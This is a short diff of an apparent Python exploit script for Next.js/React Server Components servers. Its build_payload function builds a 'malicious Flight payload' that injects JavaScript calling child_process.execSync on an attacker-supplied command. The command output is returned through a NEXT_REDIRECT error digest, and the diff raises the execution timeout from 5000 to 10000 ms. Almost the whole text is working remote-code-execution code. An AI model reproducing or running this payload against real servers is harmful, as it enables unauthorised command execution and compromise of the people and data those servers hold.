@@ -10,7 +10,7 @@ def build_payload(executable):
     """Build the malicious Flight payload that runs `executable` on the server."""
     prefix = (
         f"var res = process.mainModule.require('child_process')"
-        f".execSync('{executable} 2>&1 || true',{{'timeout':5000}}).toString().trim(); "
+        f".execSync('{executable} 2>&1 || true',{{'timeout':10000}}).toString().trim(); "
         f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
     )
     return {
